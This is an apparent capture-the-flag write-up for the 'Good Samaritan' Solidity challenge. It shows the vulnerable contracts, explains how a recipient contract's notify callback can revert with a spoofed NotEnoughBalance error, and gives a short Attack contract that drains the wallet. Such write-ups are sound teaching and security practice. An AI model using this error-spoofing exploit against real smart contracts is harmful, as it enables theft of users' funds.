## Challenge
~~~
This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.

Would you be able to drain all the balance from his Wallet?

Things that might help:

- [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```
`

## Solution

GoodSamaritan contract have
- Wallet
- Coin
- requestDonation() - tries to send 10 coins and return true else transfer remained and return false

Coin contract have
- balances mapping
- balance for wallet is set to 10^6 initially
- transfer function accepting destination address and amount
	- gets current balance of msg.sender
	- check if amount < current balance

Wallet has option to send 10 coint or all left

We need to somehow trigger the transferRemainder() - we need `wallet.donate10(msg.sender)` to return an `NotEnoughBalance` error
```
function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) { // check cannot be bypassed
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10); // we have to see if transfer can return the wanted error
        }
    }
```

In the `transfer()` function we have a check for the current amount transfered, if it lower than the current balance, we change the balances for sender and destination and then if the destination is a contract call notify function on it. Notify can be whatever function we want and it can even throw the `NotEnoughBalance`.

```
contract Attack {
    error NotEnoughBalance();
    GoodSamaritan gs = GoodSamaritan(0xA8A4412fECDC6539699a543cfB533Be0FE9304Eb);

   function attck() external {
        gs.requestDonation();
   }
   
    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
```
## Key takeaways and useful resources



